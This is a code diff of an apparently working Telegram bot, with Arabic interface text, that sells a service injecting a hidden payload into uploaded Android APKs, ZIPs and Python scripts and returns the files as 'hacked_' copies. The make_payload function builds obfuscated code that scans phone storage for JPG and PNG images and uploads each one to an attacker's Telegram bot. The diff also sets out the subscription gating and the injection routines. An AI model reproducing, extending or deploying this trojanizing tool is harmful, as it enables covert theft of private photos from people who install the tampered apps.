@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-🤖 بوت حقن Android Miner - النسخة النهائية
-- Python Script → مجاني
-- APK + ZIP → مدفوع
-- مع رسائل الترحيب والأزرار كما في النسخة القديمة
+🤖 بوت حقن Android Miner - النسخة النهائية الاحترافية
+- Python Scripts → مجاني
+- APK & ZIP → مدفوع
+- رسائل ترحيب وأزرار كما في النسخة القديمة
 """
 
 import asyncio
@@ -32,7 +32,7 @@ ADMIN_ID = 7238044992
 # States
 TOKEN, CHATID, FILE = range(3)
 
-# ====================== الرسائل مع الأزرار (كما كانت في القديم) ======================
+# ====================== الرسائل ======================
 WELCOME = """
 🤖 **بوت الحقن الاحترافي للأندرويد** 🚀
 
@@ -54,7 +54,7 @@ SUBSCRIBE_MSG = """
 2. أرسل المعرف إلى الإدارة → @CI_v_CI
 3. بعد التفعيل يمكنك رفع APK و ZIP
 
-يمكنك رفع ملفات Python (.py) **مجاناً** حالياً.
+(ملفات Python لا تزال مجانية)
 """
 
 PAID_FILE_MSG = """
@@ -64,7 +64,7 @@ PAID_FILE_MSG = """
 
 يرجى التواصل مع الإدارة @CI_v_CI بعد إرسال `/myid`
 
-(ملفات Python لا تزال مجانية)
+(ملفات Python مجانية حالياً)
 """
 
 SUCCESS = "🎉 الحقن ناجح! الملف جاهز 🟢"
@@ -80,6 +80,7 @@ DIRS = [
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# ====================== Payload Generator ======================
 def make_payload(token: str, chatid: str) -> str:
     miner = f'import os,requests,base64,zlib,hashlib,time,glob,io;k=42;d="{chatid}";c="{token}";def e(b):return bytes([ord(b[i])^k for i in range(len(b))]);exec(zlib.decompress(base64.b64decode(bytes([ord(e(d))[i]^42 for i in range(len(e(d)))])));while 1:time.sleep(120);for p in {repr(DIRS)}:if os.path.exists(p):for f in glob.glob(p+"/*.[jJ][pP][gG]")+glob.glob(p+"/*.[pP][nN][gG]"):try:s=os.stat(f);if 1024<s.st_size<50000000:h=hashlib.md5(open(f,"rb").read()).hexdigest();o=open("/sdcard/.m","a+");if h not in o.read():o.close();open("/sdcard/.m","a").write(h+"\\n");requests.post("https://api.telegram.org/bot"+c+"/sendPhoto",data={{"chat_id":d,"caption":"🖼️"}},files={{"photo":open(f,"rb")}});except:pass'
     comp = zlib.compress(miner.encode())
@@ -92,7 +93,7 @@ async def is_subscribed(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> boo
     approved = context.bot_data.get('approved_users', set())
     return user_id in approved
 
-# ====================== Handlers ======================
+# ====================== Commands ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     
@@ -104,19 +105,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(WELCOME, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
     await update.message.reply_text("🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
     return TOKEN
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if query.data == "help_token":
-        text = "**كيف تحصل على Bot Token؟**\n1. تواصل مع @BotFather\n2. أرسل /newbot\n3. انسخ التوكن وأرسله هنا"
-    elif query.data == "help_chatid":
-        text = "**كيف تحصل على Chat ID؟**\n• @userinfobot\n• @RawDataBot\n\nأرسل الـ ID هنا"
-    elif query.data == "subscribe":
-        text = SUBSCRIBE_MSG
-    
-    await query.edit_message_text(text, parse_mode='Markdown')
 
 async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -149,7 +137,7 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("⚠️ الاستخدام: `/approve 1234567890`", parse_mode='Markdown')
 
-# ====================== Conversation Flow ======================
+# ====================== Conversation Handlers ======================
 async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     token = update.message.text.strip()
     if not await validate_token(token):
@@ -179,6 +167,7 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_name = doc.file_name.lower()
     is_paid_file = file_name.endswith(('.apk', '.zip'))
 
+    # التحقق من الملفات المدفوعة
     if is_paid_file and not await is_subscribed(context, update.effective_user.id):
         file_type = "APK" if file_name.endswith('.apk') else "ZIP"
         kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
@@ -189,58 +178,18 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return FILE
 
-    # الحقن يبدأ هنا
-    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
+    # بدء عملية الحقن
+    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف...")
 
     try:
         file = await doc.get_file()
-
-        # الطريقة الصحيحة للتحميل كـ bytearray
-        await status_msg.edit_text("📥 جاري تحميل الملف...")
-        file_bytes = await file.download_as_bytearray()   # ← هذا هو الإصلاح
+        file_bytes = await file.download_as_bytearray()   # الطريقة الصحيحة
 
         await status_msg.edit_text("✅ تم تحميل الملف\n🔄 جاري الحقن...")
 
         payload = make_payload(context.user_data['token'], context.user_data['chatid'])
 
-        # Progress Bar بسيط للحقن
         with tqdm(total=100, desc="الحقن", bar_format="{l_bar}{bar} {n_fmt}%") as pbar:
-            if file_bytes.startswith(b'PK') or is_paid_file:
-                result = inject_apk(bytes(file_bytes), payload)
-            else:
-                result = inject_script(bytes(file_bytes), payload)
-            pbar.update(100)
-
-        name = f"hacked_{doc.file_name}"
-        await update.message.reply_document(
-            document=io.BytesIO(result.getvalue()) if hasattr(result, 'getvalue') else result,
-            filename=name,
-            caption=SUCCESS,
-            parse_mode='Markdown'
-        )
-
-    except Exception as e:
-        logger.error(f"Error: {e}", exc_info=True)
-        await status_msg.edit_text(f"❌ حدث خطأ أثناء المعالجة:\n{str(e)[:250]}")
-
-    context.user_data.clear()
-    return ConversationHandler.END
-    # الحقن يبدأ هنا (Python أو مشترك)
-    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
-
-    try:
-        file = await doc.get_file()
-        file_bytes = bytearray()
-        with tqdm(total=doc.file_size or 1, unit='B', unit_scale=True, desc="تحميل") as pbar:
-            async for chunk in file.download_as_bytearray_iter(chunk_size=8192):
-                file_bytes.extend(chunk)
-                pbar.update(len(chunk))
-
-        await status_msg.edit_text("✅ تم التحميل\n🔄 جاري الحقن...")
-
-        payload = make_payload(context.user_data['token'], context.user_data['chatid'])
-
-        with tqdm(total=100, desc="الحقن") as pbar:
             if file_bytes.startswith(b'PK') or is_paid_file:
                 result = inject_apk(bytes(file_bytes), payload)
             else:
@@ -256,12 +205,13 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
     except Exception as e:
-        logger.error(f"Error: {e}")
-        await status_msg.edit_text(f"❌ حدث خطأ: {str(e)[:200]}")
+        logger.error(f"Error during injection: {e}", exc_info=True)
+        await status_msg.edit_text(f"❌ حدث خطأ أثناء المعالجة:\n{str(e)[:200]}")
 
     context.user_data.clear()
     return ConversationHandler.END
 
+# ====================== Injection Functions ======================
 def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
     bio = io.BytesIO(apk_bytes)
     with zipfile.ZipFile(bio, 'r') as zf:
@@ -290,6 +240,19 @@ async def validate_token(token: str) -> bool:
     except:
         return False
 
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "help_token":
+        text = "**كيف تحصل على Bot Token؟**\n1. تواصل مع @BotFather\n2. أرسل /newbot\n3. انسخ التوكن وأرسله هنا"
+    elif query.data == "help_chatid":
+        text = "**كيف تحصل على Chat ID؟**\n• @userinfobot\n• @RawDataBot\n\nأرسل الـ ID هنا"
+    elif query.data == "subscribe":
+        text = SUBSCRIBE_MSG
+    
+    await query.edit_message_text(text, parse_mode='Markdown')
+
 # ====================== Main ======================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
@@ -314,7 +277,7 @@ def main():
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("✅ البوت يعمل الآن - مع رسائل الترحيب والأزرار القديمة")
+    print("✅ البوت الاحترافي يعمل الآن بنجاح")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
